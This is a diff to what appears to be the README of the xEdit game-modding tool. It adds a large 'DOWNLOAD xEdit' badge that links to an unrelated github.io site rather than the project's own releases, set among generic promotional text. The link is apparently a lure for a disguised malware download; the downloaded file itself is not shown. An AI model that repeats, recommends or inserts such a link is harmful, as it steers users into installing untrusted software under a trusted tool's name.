@@ -30,6 +30,12 @@ xEdit (SSEEdit, FO4Edit, etc.) is the definitive modding tool for Skyrim, Fallou
 
 Whether you're a newcomer or a veteran, xEdit provides the tools you need to get the most out of your gaming mods experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download xEdit](https://img.shields.io/badge/⬇_DOWNLOAD_xEdit-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
